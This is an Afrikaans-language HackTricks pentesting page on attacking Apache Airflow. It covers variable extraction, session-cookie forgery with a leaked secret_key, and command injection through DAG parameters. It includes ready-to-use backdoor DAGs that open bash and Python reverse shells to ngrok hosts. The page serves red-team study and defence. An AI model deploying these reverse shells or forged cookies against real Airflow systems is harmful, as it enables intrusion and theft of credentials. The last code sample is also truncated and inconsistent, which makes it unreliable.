# Apache Airflow Sekuriteit

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-repos.

</details>

## Basiese Inligting

[**Apache Airflow**](https://airflow.apache.org) dien as 'n platform vir die **orkestrering en skedulering van data-pyplyne of werkstrome**. Die term "orkestrering" in die konteks van data-pyplyne beteken die proses om komplekse data-werkstrome vanuit verskillende bronne te re√´l, te ko√∂rdineer en te bestuur. Die prim√™re doel van hierdie georkestreerde data-pyplyne is om verwerkte en bruikbare datastelle te voorsien. Hierdie datastelle word wyd gebruik deur 'n verskeidenheid toepassings, insluitend maar nie beperk tot besigheidsintelligensie-instrumente, datawetenskap en masjienleermodelle, wat almal fundamenteel is vir die werking van groot data-toepassings.

Basies sal Apache Airflow jou in staat stel om **die uitvoering van kode te skeduleer wanneer iets** (gebeurtenis, cron) **plaasvind**.

## Plaaslike Laboratorium

### Docker-Compose

Jy kan die **docker-compose-konfigurasie-l√™er vanaf** [**https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml**](https://raw.githubusercontent.com/apache/airflow/main/docs/apache-airflow/start/docker-compose.yaml) gebruik om 'n volledige Apache Airflow-docker-omgewing te begin. (As jy op MacOS is, gee ten minste 6 GB RAM aan die docker-VM).

### Minikube

Een maklike manier om **Apache Airflow te hardloop**, is om dit **met minikube** te hardloop:
```bash
helm repo add airflow-stable https://airflow-helm.github.io/charts
helm repo update
helm install airflow-release airflow-stable/airflow
# Some information about how to aceess the web console will appear after this command

# Use this command to delete it
helm delete airflow-release
```
## Airflow Konfigurasie

Airflow kan **sensitiewe inligting** in sy konfigurasie stoor of swak konfigurasies kan gevind word:

{% content-ref url="airflow-configuration.md" %}
[airflow-configuration.md](airflow-configuration.md)
{% endcontent-ref %}

## Airflow RBAC

Voordat jy Airflow aanval, moet jy verstaan **hoe toestemmings werk**:

{% content-ref url="airflow-rbac.md" %}
[airflow-rbac.md](airflow-rbac.md)
{% endcontent-ref %}

## Aanvalle

### Webkonsol Enumerasie

As jy **toegang tot die webkonsol** het, kan jy dalk toegang kry tot een of al die volgende inligting:

* **Veranderlikes** (Aangepaste sensitiewe inligting kan hier gestoor word)
* **Verbindings** (Aangepaste sensitiewe inligting kan hier gestoor word)
* Kry toegang daartoe by `http://<airflow>/connection/list/`
* [**Konfigurasie**](./#airflow-configuration) (Sensitiewe inligting soos die **`secret_key`** en wagwoorde kan hier gestoor word)
* Lys **gebruikers & rolle**
* **Kode van elke DAG** (wat interessante inligting kan bevat)

### Kry Veranderlike Waardes

Veranderlikes kan in Airflow gestoor word sodat die **DAGs** hul waardes kan **kry**. Dit is soortgelyk aan geheime van ander platforms. As jy **genoeg toestemmings** het, kan jy dit in die GUI kry by `http://<airflow>/variable/list/`.\
Airflow sal standaard die waarde van die veranderlike in die GUI wys, maar volgens [**hierdie**](https://marclamberti.com/blog/variables-with-apache-airflow/) is dit moontlik om 'n **lys van veranderlikes** in te stel waarvan die **waarde** as **asterisktegn** in die **GUI** sal verskyn.

![](<../../.gitbook/assets/image (79).png>)

Hierdie **waardes** kan egter steeds **gekry** word via **CLI** (jy moet DB-toegang h√™), **arbitr√™re DAG**-uitvoering, **API** wat die veranderlikes-eindpunt benader (die API moet geaktiveer wees), en **selfs die GUI self!**\
Om toegang tot daardie waardes vanuit die GUI te kry, **kies jy die veranderlikes** wat jy wil kry en **klik op Aksies -> Uitvoer**.\
'n Ander manier is om 'n **bruteforce** uit te voer op die **verborge waarde** deur die **soekfiltering** te gebruik totdat jy dit kry:

![](<../../.gitbook/assets/image (30).png>)

### Bevoorregte Eskalasie

As die **`expose_config`**-konfigurasie op **True** ingestel is, kan vanaf die **rol Gebruiker** en **ho√´r** die **konfigurasie in die web** **gelees** word. In hierdie konfigurasie verskyn die **`secret_key`**, wat beteken dat enige gebruiker met hierdie sleutel sy eie ondertekende koekie kan skep om enige ander gebruikersrekening na te boots.
```bash
flask-unsign --sign --secret '<secret_key>' --cookie "{'_fresh': True, '_id': '12345581593cf26619776d0a1e430c412171f4d12a58d30bef3b2dd379fc8b3715f2bd526eb00497fcad5e270370d269289b65720f5b30a39e5598dad6412345', '_permanent': True, 'csrf_token': '09dd9e7212e6874b104aad957bbf8072616b8fbc', 'dag_status_filter': 'all', 'locale': 'en', 'user_id': '1'}"
```
### DAG Agterdeur (RCE in Airflow werker)

As jy **skryftoegang** het tot die plek waar die **DAGs gestoor word**, kan jy net **een skep** wat jou 'n **omgekeerde skulp stuur**.\
Let daarop dat hierdie omgekeerde skulp binne 'n **Airflow werker houer** uitgevoer sal word:
```python
import pendulum
from airflow import DAG
from airflow.operators.bash import BashOperator

with DAG(
dag_id='rev_shell_bash',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = BashOperator(
task_id='run',
bash_command='bash -i >& /dev/tcp/8.tcp.ngrok.io/11433  0>&1',
)
```

```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

with DAG(
dag_id='rev_shell_python',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python',
python_callable=rs,
op_kwargs={"rhost":"8.tcp.ngrok.io", "port": 11433}
)
```
### DAG Agterdeur (RCE in Airflow skeduleerder)

As jy iets stel om **uitgevoer te word in die wortel van die kode**, sal dit op die oomblik van hierdie skrywe **uitgevoer word deur die skeduleerder** na 'n paar sekondes nadat dit binne die DAG se vouer geplaas is.
```python
import pendulum, socket, os, pty
from airflow import DAG
from airflow.operators.python import PythonOperator

def rs(rhost, port):
s = socket.socket()
s.connect((rhost, port))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn("/bin/sh")

rs("2.tcp.ngrok.io", 14403)

with DAG(
dag_id='rev_shell_python2',
schedule_interval='0 0 * * *',
start_date=pendulum.datetime(2021, 1, 1, tz="UTC"),
) as dag:
run = PythonOperator(
task_id='rs_python2',
python_callable=rs,
op_kwargs={"rhost":"2.tcp.ngrok.io", "port": 144}
```
### DAG Skepping

As jy daarin slaag om 'n masjien binne die DAG-kluster te **kompromitteer**, kan jy nuwe **DAG-skripsies** in die `dags/`-vouer skep en dit sal **gerepliseer word in die res van die masjiene** binne die DAG-kluster.

### DAG Kode-inspuiting

Wanneer jy 'n DAG vanaf die GUI uitvoer, kan jy **argumente** daaraan **oorhandig**.\
Daarom, as die DAG nie behoorlik gekodeer is nie, kan dit **kwesbaar wees vir Opdrag-inspuiting**.\
Dit is wat in hierdie CVE gebeur het: [https://www.exploit-db.com/exploits/49927](https://www.exploit-db.com/exploits/49927)

Al wat jy hoef te weet om **te begin soek na opdrag-inspuitings in DAGs**, is dat **parameters** **toegang kry** met die kode **`dag_run.conf.get("param_name")`**.

Verder kan dieselfde kwesbaarheid voorkom met **veranderlikes** (merk op dat jy met genoeg bevoegdhede die waarde van die veranderlikes in die GUI kan **beheer**). Veranderlikes word **toegang met**:
```python
from airflow.models import Variable
[...]
foo = Variable.get("foo")
```
As hulle byvoorbeeld binne 'n bash-opdrag gebruik word, kan jy 'n opdraginspuiting uitvoer.

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** üê¶ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslagplekke.

</details>
